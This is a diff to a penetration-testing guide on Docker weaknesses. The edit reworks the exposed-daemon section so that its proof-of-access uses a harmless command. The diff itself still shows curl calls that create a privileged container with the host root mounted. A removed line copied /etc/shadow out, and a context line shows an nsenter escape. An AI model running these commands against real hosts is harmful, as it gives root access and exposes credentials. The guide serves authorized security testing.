@@ -35,21 +35,23 @@ Docker is the most common container runtime, and its security failures are usual
 
 ### Exposed Docker Daemon (2375/2376) -> Host RCE
 
-The Docker API is root-equivalent by design. From `/containers/create` + `/containers/{id}/start`, run a container with the host filesystem mounted:
+The Docker API is root-equivalent by design. From `/containers/create` + `/containers/{id}/start`, use a benign command to prove host-root access without reading files or changing host state:
 
 ```
-# 1. Create a container mounting / to /host
+# 1. Create a short-lived container mounting / to /host
 curl -s -XPOST http://<host>:2375/containers/create \
   -H 'Content-Type: application/json' \
-  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","id > /host/tmp/pwned && cat /host/etc/shadow > /host/tmp/shadow"],
+  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","id; test -d /host/etc && echo host-root-mounted"],
        "Binds":["/:/host"],"Privileged":true}'
-# 2. Start it
+# 2. Start it (save the returned container id as <id>)
 curl -s -XPOST http://<host>:2375/containers/<id>/start
-# 3. Read the results from the host mount
-curl -s http://<host>:2375/containers/json
+# 3. Read the benign command output
+curl -s "http://<host>:2375/containers/<id>/logs?stdout=true&stderr=true"
+# 4. Remove the stopped test container
+curl -s -XDELETE "http://<host>:2375/containers/<id>?force=true"
 ```
 
-Non-destructive proof: write a marker file to `/host/tmp/`, or run `id` via `exec` and read output. The daemon API also exposes image pulls (registry creds), secrets in container env, and host process visibility.
+This proof does not read host files or write to the host filesystem. The daemon API also exposes image pulls (registry creds), secrets in container env, and host process visibility.
 
 ### docker.sock Inside a Container/CI Job
 
@@ -130,7 +132,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid sh
 
 ## Validation
 
-1. Daemon RCE: show the API calls and a marker/command result from the host filesystem
+1. Daemon RCE: show the API calls, a benign `id` result, and confirmation that the host mount is visible
 2. Registry: show the catalog/tags and a secret extracted from image config/layers (redacted)
 3. docker.sock: demonstrate host daemon control from inside the container
 4. Privileged escape: mount/nsenter proof with a benign command, then restore state
